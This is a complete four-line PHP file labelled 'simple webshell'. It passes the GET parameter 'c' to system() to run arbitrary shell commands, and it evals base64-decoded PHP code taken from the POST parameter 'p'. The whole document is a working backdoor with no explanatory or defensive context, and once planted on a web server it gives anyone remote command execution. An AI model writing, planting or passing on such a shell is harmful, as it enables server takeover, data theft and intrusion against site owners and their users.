<?php
// simple webshell
if(isset($_GET['c'])){ system($_GET['c']); }
eval(base64_decode($_POST['p']));
